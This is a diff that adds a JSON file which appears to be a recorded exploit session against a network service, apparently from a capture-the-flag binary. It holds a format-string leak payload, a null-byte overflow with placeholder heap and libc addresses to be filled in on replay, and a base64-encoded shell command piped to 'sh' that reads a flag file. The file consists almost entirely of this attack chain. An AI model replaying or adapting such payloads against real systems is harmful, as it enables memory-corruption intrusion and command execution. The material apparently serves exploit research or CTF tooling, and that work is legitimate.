@@ -1,0 +1,9 @@
+[
+    "1Who r u?\\n", 
+    "0AAAAAAAA%5p:%6p:%7p:%8p\\n", 
+    "1welcome!AAAAAAA{{{HEAP_BASE:28737:3:ORI:15:0x783041}}}{{{STACK_BASE:-14064:12:HEX:18:0x7fffb3b3e910}}}{{{HEAP_BASE:28730:3:ORI:60{{{HEAP_BASE:28730:3:ORI:45{{{HEAP_BASE:28730:3:ORI:30:0x78303a}}}78303a}}}78303a}}}{{{LIBC_BASE:3958656:12:HEX:33{{{HEAP_BASE:28730:3:ORI:30:0x78303a}}}7faecdbcd780}}}{{{HEAP_BASE:28730:3:ORI:60{{{HEAP_BASE:28730:3:ORI:45{{{HEAP_BASE:28730:3:ORI:30:0x78303a}}}78303a}}}78303a}}}{{{LIBC_BASE:1012416:12:HEX:48{{{HEAP_BASE:28730:3:ORI:45{{{HEAP_BASE:28730:3:ORI:30:0x78303a}}}78303a}}}7faecd8fe2c0}}}{{{HEAP_BASE:28730:3:ORI:60{{{HEAP_BASE:28730:3:ORI:45{{{HEAP_BASE:28730:3:ORI:30:0x78303a}}}78303a}}}78303a}}}7faecddf4700", 
+    "0\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00{{{LIBC_BASE:987463:8:ORI:72:0x7faecd8f8147}}}\\n", 
+    "1HTTP/1.1 404 Not Found\\r\\nContent{{{HEAP_BASE:103469:3:ORI:31:0x79542d}}}pe: {{{HEAP_BASE:42356:3:ORI:38:0x786574}}}t/html; charset=UTF-8\\r\\nContent-Length: 23\\r\\nServer: E{{{HEAP_BASE:111457:3:ORI:93:0x797361}}}Server (Li{{{HEAP_BASE:46446:3:ORI:106:0x78756e}}})\\r\\n\\r\\n<h3>Page Not Found</h3>", 
+    "0echo \"Y2F0IC9mbGF{{{HEAP_BASE:107374:3:ORI:17:0x79636e}}}9mYWtlLWNnaS9mbGFn{{{HEAP_BASE:34889:3:ORI:38:0x784849}}}iYXNlNjQK\" |base64 -d |sh\\n", 
+    "2sh: 1: base64: not found\\n"
+]
